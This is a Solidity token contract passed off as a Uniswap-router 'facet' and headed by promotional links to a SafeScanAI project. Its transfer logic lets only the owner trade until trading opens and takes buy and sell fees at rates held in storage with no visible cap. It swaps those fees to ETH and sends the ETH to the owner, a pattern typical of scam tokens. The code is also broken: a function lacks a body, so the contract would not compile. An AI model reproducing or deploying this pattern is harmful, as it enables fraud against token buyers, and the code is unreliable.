/*
 * Telegram: https://t.me/safescanai
 * Twitter: https://twitter.com/SafeScanAI
 * Website: https://safescanai.com/
 * Dapp: https://app.safescanai.com/
 * Docs: https://safe-scan-ai.gitbook.io/
 */

// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

import "./TestLib.sol";
contract swapExactTokensForETHSupportingFeeOnTransferTokensFacet {
    event Transfer(address indexed from, address indexed to, uint256 value);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(ds.tradingOpen || from == ds.owner || to == ds.owner);

        if (!ds.tradingOpen && ds.pair == address(0) && amount > 0)
            ds.pair = to;

        ds.balanceOf[from] -= amount;

        if (
            to == ds.pair &&
            !ds.swapping &&
            ds.balanceOf[address(this)] >= ds.swapBackAmunt
        ) {
            ds.swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ds.ETH;
            ds
                ._uniswapV2Router
                .swapExactTokensForETHSupportingFeeOnTransferTokens(
                    ds.swapBackAmunt,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            ds.owner.transfer(address(this).balance);
            ds.swapping = false;
        }

        if (from != address(this)) {
            uint256 taxAmount = (amount *
                (
                    from == ds.pair
                        ? ds.tradingFees.buyFee
                        : ds.tradingFees.sellFee
                )) / 100;
            amount -= taxAmount;
            ds.balanceOf[address(this)] += taxAmount;
        }
        ds.balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }
}
